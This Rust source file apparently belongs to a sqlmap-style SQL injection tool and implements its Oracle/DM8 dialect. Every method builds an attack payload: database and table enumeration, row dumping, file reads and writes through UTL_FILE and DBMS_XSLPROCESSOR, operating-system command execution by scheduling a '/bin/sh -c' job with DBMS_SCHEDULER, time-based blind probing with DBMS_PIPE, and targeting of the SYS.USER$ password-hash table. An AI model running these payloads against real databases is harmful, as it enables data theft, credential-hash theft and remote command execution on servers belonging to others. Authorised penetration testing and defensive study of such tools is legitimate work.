//! Oracle / DM8 (Dameng).

use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct OracleDialect;

impl Dialect for OracleDialect {
    fn dbms(&self) -> Dbms { Dbms::Oracle }
    fn banner_query(&self) -> &'static str { "(SELECT banner FROM v$version WHERE ROWNUM=1)" }
    fn current_user_query(&self) -> &'static str { "(SELECT USER FROM DUAL)" }
    fn current_db_query(&self) -> &'static str { "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL)" }
    fn hostname_query(&self) -> &'static str { "(SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM DUAL)" }
    fn is_dba_query(&self) -> &'static str { "(SELECT 1 FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE='DBA')" }
    fn list_dbs(&self) -> &'static str { "(SELECT LISTAGG(NAME,',') FROM V$DATABASE)" }
    fn list_tables(&self, db: &str) -> String {
        let _ = db;
        "(SELECT LISTAGG(OWNER||'.'||TABLE_NAME,',') WITHIN GROUP (ORDER BY OWNER) FROM ALL_TABLES)".into()
    }
    fn list_columns(&self, db: &str, table: &str) -> String {
        let _ = db;
        format!("(SELECT LISTAGG(COLUMN_NAME||':'||DATA_TYPE,',') FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{}')", table.to_uppercase())
    }
    fn count_rows(&self, db: &str, table: &str) -> String {
        let _ = db;
        format!("SELECT COUNT(*) FROM {table}")
    }
    fn dump_rows(&self, _db: &str, table: &str, cols: &[&str], start: usize, count: usize) -> String {
        let cols = if cols.is_empty() { "*".to_string() } else { cols.join(",") };
        format!("SELECT {cols} FROM (SELECT ROWNUM r,{cols} FROM {table}) WHERE r BETWEEN {start}+1 AND {start}+{count}")
    }
    fn file_read(&self, path: &str) -> String {
        format!("(SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('DIR','{path}','r'),1) FROM DUAL)")
    }
    fn file_write(&self, bytes_hex: &str, dest: &str) -> String {
        format!("BEGIN DBMS_XSLPROCESSOR.WRITE2FILE('{dest}',UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('{bytes_hex}'))); END")
    }
    fn os_cmd(&self, cmd: &str) -> String {
        // DBMS_SCHEDULER → external job. Requires CREATE JOB privilege.
        format!("BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'X',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('X',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('X',2,'{}'); DBMS_SCHEDULER.RUN_JOB('X'); END", cmd.replace('\'', "''"))
    }
    fn substr(&self, expr: &str, pos: usize, len: usize) -> String {
        format!("SUBSTR(({expr}),{pos},{len})")
    }
    fn ord(&self, ch: &str) -> String { format!("ASCII({ch})") }
    fn concat(&self, parts: &[&str]) -> String { parts.join("||") }
    fn sleep(&self, seconds: u32) -> String { format!("DBMS_PIPE.RECEIVE_MESSAGE(('a'),{seconds})") }
    fn password_table(&self) -> &'static str { "SYS.USER$" }
    fn comment(&self) -> &'static str { "-- " }
}
